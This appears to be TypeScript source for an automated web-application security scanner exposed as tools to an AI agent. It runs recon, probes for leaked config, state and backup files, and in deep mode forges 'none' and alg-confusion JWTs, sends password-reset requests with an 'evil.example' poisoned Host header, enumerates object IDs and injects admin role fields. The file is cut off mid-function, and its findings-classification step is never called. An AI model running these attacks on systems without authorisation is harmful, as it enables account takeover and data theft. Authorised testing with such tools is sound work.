import { Server } from '../mcp/server';
import axios from 'axios';
import crypto from 'crypto';
import { formatToolResult, ToolResult } from '../types';
import { getFindings, saveTestResult } from '../integrations/postgres';
import { checkCommandExists, runCommand } from '../utils/exec';
import * as fs from 'fs-extra';
import * as path from 'path';

type FlowMode = 'light' | 'standard' | 'deep';
type CheckType = 'passive' | 'safe-active' | 'intrusive';

type FlowContext = {
  target: string;
  mode: FlowMode;
  execute: boolean;
  autoRun: boolean;
  headers: Record<string, string>;
  inputs: any;
  scope?: { allow?: string[]; deny?: string[] };
  normalized?: { baseUrl: string; hosts: string[]; redirects?: string[] };
  artifacts: any;
  findings: any[];
  hypotheses: any[];
  logs: any[];
  steps: any[];
  startedAt: number;
  aborted?: boolean;
};

const COMMON_SWAGGER_PATHS = [
  '/swagger.json',
  '/openapi.json',
  '/api-docs',
  '/v2/api-docs',
  '/swagger/v1/swagger.json',
];

const COMMON_GRAPHQL_PATHS = ['/graphql', '/api/graphql'];
const INTROSPECTION_QUERY = '{ __schema { types { name } } }';

const LEAK_PATHS = [
  '/terraform.tfstate',
  '/terraform.tfstate.backup',
  '/.terraform/terraform.tfstate',
  '/tfstate',
  '/state/terraform.tfstate',
  '/.env',
  '/.env.production',
];

const BACKUP_PATHS = [
  '/backup.zip',
  '/backup.tar.gz',
  '/site.bak',
  '/www.zip',
  '/db.sql',
];

const LIMITS = {
  maxPayloadsPerEndpoint: 20,
  maxRequestsPerSecond: 5,
  stopOn429Spike: true,
  stopOn403Spike: true,
  wafPatterns: ['access denied', 'request blocked', 'cloudflare', 'akamai'],
};

const EXEC_LOG_DIR = path.join(process.cwd(), 'scans');
const EXEC_LOG_FILE = path.join(EXEC_LOG_DIR, 'execution_log.jsonl');

export function registerScannerTools(server: Server) {
  server.tool(
    'scanner.normalize_target',
    {
      description: 'Normalize target into canonical URL + host set',
      inputSchema: {
        type: 'object',
        properties: {
          target: { type: 'string' },
        },
        required: ['target'],
      },
    },
    async ({ target }: any): Promise<ToolResult> => {
      try {
        const normalized = await normalizeTarget(target);
        return formatToolResult(true, normalized);
      } catch (error: any) {
        return formatToolResult(false, null, error.message);
      }
    }
  );

  server.tool(
    'scanner.execution_log',
    {
      description: 'Read recent execution logs for reproducibility',
      inputSchema: {
        type: 'object',
        properties: {
          limit: { type: 'number', default: 50 },
        },
      },
    },
    async ({ limit = 50 }: any): Promise<ToolResult> => {
      try {
        if (!(await fs.pathExists(EXEC_LOG_FILE))) {
          return formatToolResult(true, { entries: [] });
        }
        const content = await fs.readFile(EXEC_LOG_FILE, 'utf-8');
        const lines = content.trim().split('\n').filter(Boolean);
        const tail = lines.slice(Math.max(0, lines.length - limit)).map((line) => JSON.parse(line));
        return formatToolResult(true, { entries: tail });
      } catch (error: any) {
        return formatToolResult(false, null, error.message);
      }
    }
  );

  server.tool(
    'scanner.correlate_findings',
    {
      description: 'Correlate findings into higher-impact chains',
      inputSchema: {
        type: 'object',
        properties: {
          target: { type: 'string' },
          limit: { type: 'number', default: 100 },
        },
      },
    },
    async ({ target, limit = 100 }: any): Promise<ToolResult> => {
      try {
        const findings = await getFindings(target, limit);
        const types = new Set(findings.map((f) => f.type));
        const correlations: string[] = [];

        if (types.has('GraphQL Introspection') && types.has('BOLA/IDOR')) {
          correlations.push('Critical: GraphQL introspection + BOLA => data exposure risk');
        }
        if (types.has('Auth Bypass') && types.has('IDOR')) {
          correlations.push('High: Auth bypass + IDOR => account takeover risk');
        }
        if (types.has('Public S3 Bucket') && types.has('Exposed Config File')) {
          correlations.push('High: Public bucket + config leak => secret exposure chain');
        }

        return formatToolResult(true, { correlations });
      } catch (error: any) {
        return formatToolResult(false, null, error.message);
      }
    }
  );

  server.tool(
    'scanner.run_flow',
    {
      description: 'Run a state-machine flow once a target is provided',
      inputSchema: {
        type: 'object',
        properties: {
          target: { type: 'string', description: 'Target domain or URL' },
          mode: { type: 'string', enum: ['light', 'standard', 'deep'], default: 'standard' },
          execute: { type: 'boolean', default: true },
          headers: { type: 'object', description: 'Optional headers for requests' },
          autoRun: { type: 'boolean', description: 'Auto-run safe tools where possible', default: true },
          scope: {
            type: 'object',
            properties: {
              allow: { type: 'array', items: { type: 'string' } },
              deny: { type: 'array', items: { type: 'string' } },
            },
          },
          inputs: {
            type: 'object',
            description: 'Optional inputs to enable deeper safe checks',
            properties: {
              cloud: {
                type: 'object',
                properties: {
                  targets: {
                    type: 'array',
                    items: {
                      type: 'object',
                      properties: {
                        provider: { type: 'string', enum: ['s3', 'azure', 'gcp'] },
                        bucket: { type: 'string' },
                        account: { type: 'string' },
                        container: { type: 'string' },
                      },
                    },
                  },
                },
              },
              auth: {
                type: 'object',
                properties: {
                  jwt: {
                    type: 'object',
                    properties: {
                      url: { type: 'string' },
                      token: { type: 'string' },
                      headerName: { type: 'string', default: 'Authorization' },
                      expectedUnauthorizedStatus: { type: 'number', default: 401 },
                    },
                    required: ['url', 'token'],
                  },
                  jwtAlgConfusion: {
                    type: 'object',
                    properties: {
                      url: { type: 'string' },
                      token: { type: 'string' },
                      publicKey: { type: 'string' },
                      headerName: { type: 'string', default: 'Authorization' },
                    },
                    required: ['url', 'token', 'publicKey'],
                  },
                  sessionFixation: {
                    type: 'object',
                    properties: {
                      loginUrl: { type: 'string' },
                      loginBody: { type: 'object' },
                      sessionCookieName: { type: 'string', default: 'session' },
                    },
                    required: ['loginUrl', 'loginBody'],
                  },
                  passwordReset: {
                    type: 'object',
                    properties: {
                      resetUrl: { type: 'string' },
                      email: { type: 'string' },
                      poisonHost: { type: 'string', default: 'evil.example' },
                    },
                    required: ['resetUrl', 'email'],
                  },
                },
              },
              api: {
                type: 'object',
                properties: {
                  rateLimitBurst: {
                    type: 'object',
                    properties: {
                      url: { type: 'string' },
                      method: { type: 'string', enum: ['GET', 'POST', 'PUT', 'DELETE'], default: 'GET' },
                      headers: { type: 'object' },
                      body: { type: 'object' },
                      requests: { type: 'number', default: 20 },
                    },
                    required: ['url'],
                  },
                  bola: {
                    type: 'object',
                    properties: {
                      url: { type: 'string' },
                      idParam: { type: 'string', default: 'id' },
                      ids: { type: 'array', items: { type: 'string' } },
                      headers: { type: 'object' },
                    },
                    required: ['url', 'ids'],
                  },
                  massAssignment: {
                    type: 'object',
                    properties: {
                      url: { type: 'string' },
                      method: { type: 'string', enum: ['POST', 'PUT', 'PATCH'], default: 'POST' },
                      headers: { type: 'object' },
                      baselineBody: { type: 'object' },
                      testBody: { type: 'object' },
                    },
                    required: ['url', 'baselineBody'],
                  },
                  fuzz: {
                    type: 'object',
                    properties: {
                      url: { type: 'string' },
                      method: { type: 'string', enum: ['GET', 'POST', 'PUT'], default: 'GET' },
                      headers: { type: 'object' },
                      params: { type: 'object' },
                      maxCases: { type: 'number', default: 25 },
                    },
                    required: ['url', 'params'],
                  },
                },
              },
            },
          },
        },
        required: ['target'],
      },
    },
    async ({
      target,
      mode = 'standard',
      execute = true,
      headers = {},
      autoRun = true,
      inputs = {},
      scope,
    }: any): Promise<ToolResult> => {
      const ctx: FlowContext = {
        target,
        mode,
        execute,
        autoRun,
        headers,
        inputs,
        scope,
        artifacts: {
          swagger: [],
          graphql: [],
          leaks: [],
          csp: [],
          attackSurfaceMap: [],
          fingerprints: [],
          recon: { subdomains: [], liveHosts: [], urls: [] },
          autoRun: { api: [], auth: [], cloud: [] },
          summary: {},
        },
        findings: [],
        hypotheses: [],
        logs: [],
        steps: [],
        startedAt: Date.now(),
      };

      try {
        const flow = [
          normalizeTargetStep,
          fingerprintTargetStep,
          validateScopeStep,
          safetyProfileInitStep,
          checkReachabilityStep,
          reconPhaseStep,
          liveSurfaceMappingStep,
          surfaceDiscoveryStep,
          generateHypothesesStep,
          conditionalSecurityStep,
          deepTestingStep,
          correlateFindingsStep,
          classifySeverityStep,
          generateSummaryStep,
        ];

        for (const step of flow) {
          ctx.steps.push({ step: step.name, status: 'started' });
          if (ctx.aborted) {
            ctx.steps.push({ step: step.name, status: 'skipped' });
            continue;
          }
          await step(ctx);
          ctx.steps.push({ step: step.name, status: 'ok' });
        }

        await saveTestResult(ctx.normalized?.baseUrl || target, 'scanner_run_flow', true, {
          steps: ctx.steps,
          artifacts: ctx.artifacts,
          findings: ctx.findings,
          hypotheses: ctx.hypotheses,
          mode: ctx.mode,
          durationMs: Date.now() - ctx.startedAt,
        });

        return formatToolResult(true, {
          steps: ctx.steps,
          artifacts: ctx.artifacts,
          findings: ctx.findings,
          plan: buildPlan(ctx.normalized?.baseUrl || target, mode),
        });
      } catch (error: any) {
        return formatToolResult(false, null, error.message);
      }
    }
  );
}

async function normalizeTargetStep(ctx: FlowContext): Promise<void> {
  const normalized = await normalizeTarget(ctx.target, ctx.headers);
  ctx.normalized = normalized;
  await logExecution(ctx, {
    step: 'normalize_target',
    action: 'normalize',
    target: ctx.target,
    status: 'ok',
  });
}

async function fingerprintTargetStep(ctx: FlowContext): Promise<void> {
  const baseUrl = ctx.normalized?.baseUrl;
  if (!baseUrl) return;
  const response = await axios.get(baseUrl, {
    headers: ctx.headers,
    validateStatus: () => true,
    timeout: 15000,
  });
  const body = typeof response.data === 'string' ? response.data : JSON.stringify(response.data);
  const headers = response.headers || {};

  const fingerprint = {
    server: headers['server'] || null,
    framework: detectFramework(headers, body),
    cloudHints: detectCloudHints(headers, body),
    cdnWaf: detectCdnWaf(headers, body),
  };

  ctx.artifacts.fingerprints.push({ baseUrl, fingerprint });
  await logExecution(ctx, {
    step: 'fingerprint_target',
    action: 'fingerprint',
    target: baseUrl,
    status: response.status,
    responseHash: hashBody(response.data),
  });
}

async function validateScopeStep(ctx: FlowContext): Promise<void> {
  if (!ctx.scope?.allow?.length && !ctx.scope?.deny?.length) return;
  const hosts = ctx.normalized?.hosts || [];
  const inAllow = ctx.scope.allow?.length
    ? hosts.some((h) => matchesAny(h, ctx.scope?.allow || []))
    : true;
  const inDeny = ctx.scope.deny?.length
    ? hosts.some((h) => matchesAny(h, ctx.scope?.deny || []))
    : false;

  if (!inAllow || inDeny) {
    ctx.aborted = true;
    ctx.artifacts.summary.scope = 'out_of_scope';
  } else {
    ctx.artifacts.summary.scope = 'in_scope';
  }
  await logExecution(ctx, {
    step: 'validate_scope',
    action: 'scope_check',
    target: hosts.join(','),
    status: ctx.aborted ? 'blocked' : 'ok',
  });
}

async function safetyProfileInitStep(ctx: FlowContext): Promise<void> {
  ctx.artifacts.summary.safetyProfile = ctx.mode;
  await logExecution(ctx, {
    step: 'safety_profile_init',
    action: 'mode',
    target: ctx.normalized?.baseUrl || ctx.target,
    status: ctx.mode,
  });
}

async function checkReachabilityStep(ctx: FlowContext): Promise<void> {
  const baseUrl = ctx.normalized?.baseUrl;
  if (!baseUrl) return;
  const response = await axios.get(baseUrl, { headers: ctx.headers, validateStatus: () => true, timeout: 15000 });
  ctx.artifacts.summary.reachability = response.status;
  await logExecution(ctx, {
    step: 'check_reachability',
    action: 'get',
    target: baseUrl,
    status: response.status,
    responseHash: hashBody(response.data),
  });
}

async function reconPhaseStep(ctx: FlowContext): Promise<void> {
  if (!isAllowed(ctx.mode, 'passive')) return;
  const baseUrl = ctx.normalized?.baseUrl;
  if (!baseUrl) return;

  const tempDir = path.join('/tmp', `scanner_${Date.now()}`);
  await fs.ensureDir(tempDir);
  const reconDomain = new URL(baseUrl).hostname;

  const hasSubfinder = await checkCommandExists('subfinder');
  if (hasSubfinder) {
    const result = await runCommand('subfinder', ['-d', reconDomain, '-silent']);
    ctx.artifacts.recon.subdomains = result.stdout
      .split('\n')
      .filter((s) => s.trim().length > 0);
  }

  const hasAmass = await checkCommandExists('amass');
  if (hasAmass) {
    const result = await runCommand('amass', ['enum', '-d', reconDomain, '-passive'], 120000);
    const amassSubs = result.stdout
      .split('\n')
      .filter((s) => s.trim().length > 0 && s.includes('.'));
    ctx.artifacts.recon.subdomains = Array.from(
      new Set([...(ctx.artifacts.recon.subdomains || []), ...amassSubs])
    );
  }

  const hasHttpx = await checkCommandExists('httpx');
  if (hasHttpx && ctx.artifacts.recon.subdomains.length > 0) {
    const inputFile = path.join(tempDir, 'subdomains.txt');
    await fs.writeFile(inputFile, ctx.artifacts.recon.subdomains.join('\n'));
    const result = await runCommand('httpx', ['-l', inputFile, '-silent', '-status-code']);
    ctx.artifacts.recon.liveHosts = result.stdout
      .split('\n')
      .filter((s) => s.trim().length > 0);
  }

  const hasGau = await checkCommandExists('gau');
  if (hasGau) {
    const result = await runCommand('gau', ['--subs', '--threads', '5', reconDomain], 120000);
    ctx.artifacts.recon.urls = result.stdout
      .split('\n')
      .filter((s) => s.trim().length > 0);
  }

  // crt.sh optional
  try {
    const crtUrl = `https://crt.sh/?q=%25.${reconDomain}&output=json`;
    const crtResp = await axios.get(crtUrl, { validateStatus: () => true, timeout: 15000 });
    if (crtResp.status === 200 && Array.isArray(crtResp.data)) {
      const names = crtResp.data
        .map((row: any) => String(row.name_value || ''))
        .join('\n')
        .split('\n')
        .filter((s: string) => s.includes('.'));
      ctx.artifacts.recon.subdomains = Array.from(
        new Set([...(ctx.artifacts.recon.subdomains || []), ...names])
      );
    }
  } catch {
    // ignore crt.sh failures
  }

  await fs.remove(tempDir);
  await logExecution(ctx, {
    step: 'recon_phase',
    action: 'recon_tools',
    target: reconDomain,
    status: 'ok',
    data: {
      subdomains: ctx.artifacts.recon.subdomains.length,
      liveHosts: ctx.artifacts.recon.liveHosts.length,
      urls: ctx.artifacts.recon.urls.length,
    },
  });
}

async function surfaceDiscoveryStep(ctx: FlowContext): Promise<void> {
  if (!isAllowed(ctx.mode, 'safe-active')) return;
  const targets = getTargets(ctx);

  for (const baseTarget of targets) {
    for (const p of COMMON_SWAGGER_PATHS) {
      const url = baseTarget + p;
      const response = await axios.get(url, { validateStatus: () => true, timeout: 15000 });
      const body = typeof response.data === 'string' ? response.data : JSON.stringify(response.data);
      const openApi = body.includes('"openapi"') || body.includes('"swagger"');
      if (openApi) ctx.artifacts.swagger.push({ base: baseTarget, path: p, status: response.status });
    }
  }

  for (const baseTarget of targets) {
    for (const p of COMMON_GRAPHQL_PATHS) {
      const url = baseTarget + p;
      const response = await axios.post(
        url,
        { query: INTROSPECTION_QUERY },
        {
          headers: { 'Content-Type': 'application/json', ...ctx.headers },
          validateStatus: () => true,
          timeout: 15000,
        }
      );
      const enabled = response.status === 200 && !!response.data?.data?.__schema;
      if (enabled) ctx.artifacts.graphql.push({ base: baseTarget, path: p, status: response.status });
    }
  }

  for (const baseTarget of targets) {
    for (const p of LEAK_PATHS) {
      const url = baseTarget + p;
      const response = await axios.get(url, { validateStatus: () => true, timeout: 15000 });
      if (response.status === 200 && response.data) {
        ctx.artifacts.leaks.push({ base: baseTarget, path: p, status: response.status });
      }
    }
    for (const p of BACKUP_PATHS) {
      const url = baseTarget + p;
      const response = await axios.get(url, { validateStatus: () => true, timeout: 15000 });
      if (response.status === 200 && response.data) {
        ctx.artifacts.leaks.push({ base: baseTarget, path: p, status: response.status });
      }
    }
  }

  for (const baseTarget of targets) {
    const response = await axios.get(baseTarget, { validateStatus: () => true, timeout: 15000 });
    const csp = response.headers['content-security-policy'] || response.headers['x-content-security-policy'];
    ctx.artifacts.csp.push({ base: baseTarget, present: !!csp, value: csp || null });
  }

  await logExecution(ctx, {
    step: 'surface_discovery_phase',
    action: 'surface_discovery',
    target: targets.join(','),
    status: 'ok',
  });
}

async function liveSurfaceMappingStep(ctx: FlowContext): Promise<void> {
  if (!isAllowed(ctx.mode, 'safe-active')) return;
  const targets = getTargets(ctx);
  for (const baseTarget of targets) {
    const response = await axios.get(baseTarget, { headers: ctx.headers, validateStatus: () => true, timeout: 15000 });
    const body = typeof response.data === 'string' ? response.data : JSON.stringify(response.data);
    const title = extractTitle(body);
    const tech = detectFramework(response.headers || {}, body);
    const jwtDetected = detectJwtInText(JSON.stringify(response.headers || {}) + body);
    ctx.artifacts.attackSurfaceMap.push({
      url: baseTarget,
      status: response.status,
      length: body.length,
      title,
      tech,
      jwtDetected,
      hash: hashBody(body),
    });
  }
  await logExecution(ctx, {
    step: 'live_surface_mapping',
    action: 'map',
    target: targets.join(','),
    status: 'ok',
  });
}

async function generateHypothesesStep(ctx: FlowContext): Promise<void> {
  const hypotheses: any[] = [];
  if (ctx.artifacts.graphql.length > 0) {
    hypotheses.push({ type: 'graphql_introspection', reason: 'GraphQL endpoint found' });
    hypotheses.push({ type: 'graphql_missing_auth', reason: 'GraphQL endpoint found' });
    hypotheses.push({ type: 'graphql_bola', reason: 'GraphQL endpoint found' });
  }
  if (ctx.artifacts.swagger.length > 0) {
    hypotheses.push({ type: 'swagger_internal_exposure', reason: 'Swagger/OpenAPI docs found' });
  }
  const jwtDetected = (ctx.artifacts.attackSurfaceMap || []).some((entry: any) => entry.jwtDetected);
  if (jwtDetected) {
    hypotheses.push({ type: 'jwt_none', reason: 'JWT token pattern detected' });
    hypotheses.push({ type: 'jwt_weak_secret', reason: 'JWT token pattern detected' });
  }
  const oauthDetected = (ctx.artifacts.recon.urls || []).some((url: string) =>
    /redirect_uri=|response_type=code|oauth\/authorize/i.test(url)
  );
  if (oauthDetected) {
    hypotheses.push({ type: 'oauth_open_redirect', reason: 'OAuth redirect parameters detected' });
  }
  const idParamDetected = (ctx.artifacts.recon.urls || []).some((url: string) =>
    /[?&](id|userId|accountId)=/i.test(url)
  );
  if (idParamDetected) {
    hypotheses.push({ type: 'bola_id_parameter', reason: 'ID-like parameter detected in URLs' });
  }
  const rateLimitSuspected = (ctx.artifacts.attackSurfaceMap || []).some((entry: any) => entry.status === 429);
  if (rateLimitSuspected) {
    hypotheses.push({ type: 'rate_limit_suspected', reason: '429 responses detected' });
  }

  ctx.hypotheses = hypotheses;
}

async function conditionalSecurityStep(ctx: FlowContext): Promise<void> {
  if (!ctx.autoRun || !isAllowed(ctx.mode, 'safe-active')) return;
  const targets = getTargets(ctx);

  if (ctx.hypotheses.some((h: any) => h.type === 'graphql_introspection')) {
    for (const gql of ctx.artifacts.graphql) {
      ctx.artifacts.autoRun.api.push({
        tool: 'api.graphql_introspection',
        url: gql.base + gql.path,
        enabled: true,
        status: gql.status,
      });
    }
  }

  for (const baseTarget of targets) {
    const response = await axios.get(baseTarget, { headers: ctx.headers, validateStatus: () => true, timeout: 15000 });
    const body = typeof response.data === 'string' ? response.data : JSON.stringify(response.data);
    const signals = ['mfa', 'otp', 'two-factor'].filter((s) => body.toLowerCase().includes(s));
    ctx.artifacts.autoRun.auth.push({
      tool: 'auth.detect_mfa_signals',
      url: baseTarget,
      status: response.status,
      signals,
    });
  }

  for (const leak of ctx.artifacts.leaks) {
    const url = leak.base + leak.path;
    const response = await axios.get(url, { validateStatus: () => true, timeout: 15000 });
    const body = typeof response.data === 'string' ? response.data : JSON.stringify(response.data);
    ctx.artifacts.autoRun.cloud.push({
      tool: 'cloud.detect_keys_in_env',
      url,
      matches: scanExposedKeys(body),
    });
  }

  if (ctx.inputs?.cloud?.targets?.length) {
    ctx.artifacts.autoRun.cloud.push({
      tool: 'cloud.bucket_permission_probe',
      targets: ctx.inputs.cloud.targets,
    });
  }

  await logExecution(ctx, {
    step: 'conditional_security_phase',
    action: 'auto_safe',
    target: targets.join(','),
    status: 'ok',
  });
}

async function deepTestingStep(ctx: FlowContext): Promise<void> {
  if (!isAllowed(ctx.mode, 'intrusive')) return;
  const deepInputs = ctx.inputs || {};
  const targets = getTargets(ctx);

  if (deepInputs?.api?.rateLimitBurst) {
    const { url, method = 'GET', headers: rateHeaders = {}, body, requests = 20 } = deepInputs.api.rateLimitBurst;
    const capped = Math.min(requests, LIMITS.maxPayloadsPerEndpoint);
    const statuses: number[] = [];
    let consecutive429 = 0;
    let consecutive403 = 0;

    for (let i = 0; i < capped; i++) {
      const response = await axios({
        url,
        method: method.toLowerCase(),
        headers: rateHeaders,
        data: body,
        validateStatus: () => true,
        timeout: 15000,
      });
      statuses.push(response.status);
      consecutive429 = response.status === 429 ? consecutive429 + 1 : 0;
      consecutive403 = response.status === 403 ? consecutive403 + 1 : 0;
      if (LIMITS.stopOn429Spike && consecutive429 >= 3) {
        ctx.artifacts.summary.earlyAborts = (ctx.artifacts.summary.earlyAborts || 0) + 1;
        break;
      }
      if (LIMITS.stopOn403Spike && consecutive403 >= 3) {
        ctx.artifacts.summary.earlyAborts = (ctx.artifacts.summary.earlyAborts || 0) + 1;
        break;
      }
      await sleep(1000 / LIMITS.maxRequestsPerSecond);
    }

    ctx.artifacts.autoRun.api.push({
      tool: 'api.rate_limit_test',
      url,
      requests: capped,
      statuses,
      severity: classifyStatusRisk(statuses),
    });
  }

  if (deepInputs?.api?.fuzz) {
    const { url, method = 'GET', headers: fuzzHeaders = {}, params, maxCases = 25 } = deepInputs.api.fuzz;
    const cases = buildFuzzCases(params, Math.min(maxCases, LIMITS.maxPayloadsPerEndpoint));
    const results: any[] = [];
    let wafHit = false;

    for (const payload of cases) {
      const response = await axios({
        url,
        method: method.toLowerCase(),
        headers: fuzzHeaders,
        params: method.toUpperCase() === 'GET' ? payload : undefined,
        data: method.toUpperCase() === 'GET' ? undefined : payload,
        validateStatus: () => true,
        timeout: 15000,
      });
      const body = typeof response.data === 'string' ? response.data : JSON.stringify(response.data);
      results.push({ payload, status: response.status });
      if (detectWaf(body)) {
        wafHit = true;
        ctx.artifacts.summary.earlyAborts = (ctx.artifacts.summary.earlyAborts || 0) + 1;
        break;
      }
      await sleep(1000 / LIMITS.maxRequestsPerSecond);
    }

    ctx.artifacts.autoRun.api.push({
      tool: 'ai.fuzz_smart',
      url,
      cases: results.length,
      results,
      wafHit,
      severity: classifyStatusRisk(results.map((r) => r.status)),
    });
  }

  if (deepInputs?.auth?.jwt && ctx.hypotheses.some((h: any) => h.type === 'jwt_none')) {
    const { url, token, headerName = 'Authorization', expectedUnauthorizedStatus = 401 } = deepInputs.auth.jwt;
    const baseline = await axios.get(url, {
      headers: { [headerName]: `Bearer ${token}` },
      validateStatus: () => true,
      timeout: 15000,
    });
    const unsigned = toNoneJwt(token);
    const noneResp = await axios.get(url, {
      headers: { [headerName]: `Bearer ${unsigned}` },
      validateStatus: () => true,
      timeout: 15000,
    });
    ctx.artifacts.autoRun.auth.push({
      tool: 'auth.test_jwt_none',
      url,
      baselineStatus: baseline.status,
      noneStatus: noneResp.status,
      likelyVulnerable: baseline.status === expectedUnauthorizedStatus && noneResp.status === 200,
    });
  }

  if (deepInputs?.auth?.jwtAlgConfusion && ctx.hypotheses.some((h: any) => h.type === 'jwt_none')) {
    const { url, token, publicKey, headerName = 'Authorization' } = deepInputs.auth.jwtAlgConfusion;
    const forged = forgeHs256(token, publicKey);
    const response = await axios.get(url, {
      headers: { [headerName]: `Bearer ${forged}` },
      validateStatus: () => true,
      timeout: 15000,
    });
    ctx.artifacts.autoRun.auth.push({
      tool: 'auth.test_jwt_alg_confusion',
      url,
      status: response.status,
      likelyVulnerable: response.status === 200,
    });
  }

  if (deepInputs?.auth?.sessionFixation) {
    const { loginUrl, loginBody, sessionCookieName = 'session' } = deepInputs.auth.sessionFixation;
    const pre = await axios.get(loginUrl, { validateStatus: () => true, timeout: 15000 });
    const preCookie = (pre.headers['set-cookie'] || []).find((c: string) => c.startsWith(sessionCookieName));
    const response = await axios.post(loginUrl, loginBody, {
      headers: preCookie ? { Cookie: preCookie } : undefined,
      validateStatus: () => true,
      timeout: 15000,
    });
    const postCookie = (response.headers['set-cookie'] || []).find((c: string) => c.startsWith(sessionCookieName));
    ctx.artifacts.autoRun.auth.push({
      tool: 'auth.test_session_fixation',
      loginUrl,
      fixed: !!preCookie && !!postCookie && preCookie === postCookie,
    });
  }

  if (deepInputs?.auth?.passwordReset && ctx.hypotheses.some((h: any) => h.type === 'oauth_open_redirect')) {
    const { resetUrl, email, poisonHost = 'evil.example' } = deepInputs.auth.passwordReset;
    const response = await axios.post(
      resetUrl,
      { email },
      {
        headers: {
          Host: poisonHost,
          'X-Forwarded-Host': poisonHost,
        },
        validateStatus: () => true,
        timeout: 15000,
      }
    );
    const body = typeof response.data === 'string' ? response.data : JSON.stringify(response.data);
    ctx.artifacts.autoRun.auth.push({
      tool: 'auth.test_password_reset_poisoning',
      resetUrl,
      reflected: body.includes(poisonHost),
    });
  }

  if (
    deepInputs?.api?.bola &&
    ctx.hypotheses.some((h: any) => h.type === 'graphql_bola' || h.type === 'bola_id_parameter')
  ) {
    const { url, idParam = 'id', ids, headers: bolaHeaders = {} } = deepInputs.api.bola;
    const results: any[] = [];
    let baseline: any | null = null;

    for (const id of ids) {
      const response = await axios.get(url, {
        params: { [idParam]: id },
        headers: bolaHeaders,
        validateStatus: () => true,
        timeout: 15000,
      });
      if (!baseline) baseline = response;
      const different =
        response.status !== baseline.status ||
        JSON.stringify(response.data) !== JSON.stringify(baseline.data);
      results.push({ id, status: response.status, different });
    }

    ctx.artifacts.autoRun.api.push({
      tool: 'api.bola_test',
      url,
      results,
      severity: classifyBolaRisk(results),
    });
  }

  if (deepInputs?.api?.massAssignment) {
    const { url, method = 'POST', headers: apiHeaders = {}, baselineBody, testBody } = deepInputs.api.massAssignment;
    const injected = testBody || { ...baselineBody, role: 'admin', isAdmin: true, privileges: ['admin'] };
    const baselineResp = await axios({
      url,
      method: method.toLowerCase(),
      headers: { 'Content-Type': 'application/json', ...apiHeaders },
      data: baselineBody,
      validateStatus: () => true,
      timeout: 15000,
    });
    const testResp = await axios({
      url,
      method: method.toLowerCase(),
      headers: { 'Content-Type': 'application/json', ...apiHeaders },
      data: injected,
      validateStatus: () => true,
      timeout: 15000,
    });
    ctx.artifacts.autoRun.api.push({
      tool: 'api.mass_assignment_test',
      url,
      baselineStatus: baselineResp.status,
      testStatus: testResp.status,
      severity: classifyStatusRisk([baselineResp.status, testResp.status]),
    });
  }

  await logExecution(ctx, {
    step: 'deep_testing_phase',
    action: 'deep_checks',
    target: targets.join(','),
    status: 'ok',
  });
}

async function classifyFindingsStep(ctx: FlowContext): Promise<void> {
  const findings: any[] = [];

  for (const item of ctx.artifacts.autoRun.api || []) {
    if (item.tool === 'api.bola_test') {
      const hasDiff = (item.results || []).some((r: any) => r.different && r.status === 200);
      if (hasDiff) findings.push({ type: 'BOLA/IDOR', severity: 'high', evidence: item });
    }
  }

  for (const item of ctx.artifacts.autoRun.auth || []) {
    if (item.tool === 'auth.test_jwt_none' && item.likelyVulnerable) {
      findings.push({ type: 'JWT None Algorithm', severity: 'critical', evidence: item });
    }
    if (item.tool === 'auth.test_jwt_alg_confusion' && item.likelyVulnerable) {
      findings.push({ type: 'JWT Alg Confusion', severity: 'high', evidence: item });
    }
  }

  for (const leak of ctx.artifacts.leaks || []) {
    findings.push({ type: 'Exposed Config File', severity: 'high', evidence: leak });
  }

  ctx.findings = findings;
}

async function correlateFindingsStep(ctx: FlowContext): Promise<void> {
  const correlations: string[] = [];
  const types = new Set(ctx.findings.map((f) => f.type));

  if (types.has('BOLA/IDOR') && ctx.hypotheses.some((h: any) => h.type === 'graphql_introspection')) {
    correlations.push('Critical: GraphQL introspection + BOLA => unauthenticated data exposure risk');
  }
  if (types.has('JWT None Algorithm')) {
    correlations.push('Critical: JWT none accepted => auth bypass risk');
  }
  if (ctx.artifacts.swagger.length > 0) {
    correlations.push('Medium: Swagger exposure may reveal internal endpoints');
  }
  ctx.artifacts.correlations = correlations;
}

async function classifySeverityStep(ctx: FlowContext): Promise<void> {
  ctx.findings = ctx.findings.map((finding) => ({
    ...finding,
    severity: modelSeverity(finding),
  }));
}

async function generateSummaryStep(ctx: FlowContext): Promise<void> {
  const durationMs = Date.now() - ctx.startedAt;
  const targets = getTargets(ctx);
  ctx.artifacts.summary = {
    mode: ctx.mode,
    durationMs,
    hostsDiscovered: targets.length,
    subdomains: ctx.artifacts.recon.subdomains.length,
    liveHosts: ctx.artifacts.recon.liveHosts.length,
    urls: ctx.artifacts.recon.urls.length,
    checksExecuted: ctx.steps.filter((s) => s.status === 'ok').length,
    hypothesesGenerated: ctx.hypotheses.length,
    testsPerHost: Math.ceil(ctx.steps.filter((s) => s.status === 'ok').length / Math.max(targets.length, 1)),
  };
}

function buildPlan(baseUrl: string, mode: FlowMode): string[] {
  const plan = [
    `Normalize target → base URL (${baseUrl})`,
    'Validate scope',
    'Check reachability',
    'Recon phase (subfinder/amass/httpx/gau if available)',
    'Surface discovery (Swagger/GraphQL/leaks/CSP)',
    'Conditional security phase (safe auto checks)',
    'Deep testing (bounded)',
    'Classify findings',
    'Generate summary',
  ];

  if (mode === 'light') return plan.filter((p) => !p.includes('Deep testing'));
  return plan;
}

function isAllowed(mode: FlowMode, checkType: CheckType): boolean {
  if (mode === 'light') return checkType === 'passive';
  if (mode === 'standard') return checkType === 'passive' || checkType === 'safe-active';
  return true;
}

async function normalizeTarget(target: string, headers?: Record<string, string>) {
  const cleaned = target.trim().replace(/#.*$/, '');
  const hasProto = cleaned.startsWith('http');
  const httpsCandidate = cleaned.startsWith('https://') ? cleaned : `https://${cleaned.replace(/^http:\/\//, '')}`;
  let url = new URL(httpsCandidate);
  let baseUrl = `${url.protocol}//${url.host}`.replace(/\/$/, '');
  const hosts = Array.from(new Set([url.host, url.host.replace(/^www\./, '')]));
  const redirects: string[] = [];

  try {
    const response = await axios.get(baseUrl, {
      headers,
      validateStatus: () => true,
      maxRedirects: 5,
      timeout: 15000,
    });
    const finalUrl = response.request?.res?.responseUrl;
    if (finalUrl && finalUrl !== baseUrl) redirects.push(finalUrl);
  } catch {
    if (hasProto && cleaned.startsWith('http://')) {
      url = new URL(cleaned);
      baseUrl = `${url.protocol}//${url.host}`.replace(/\/$/, '');
    }
  }

  const cname = await resolveCname(url.hostname);
  return { baseUrl, hosts: Array.from(new Set([...hosts, ...(cname ? [cname] : [])])), redirects };
}

function getTargets(ctx: FlowContext): string[] {
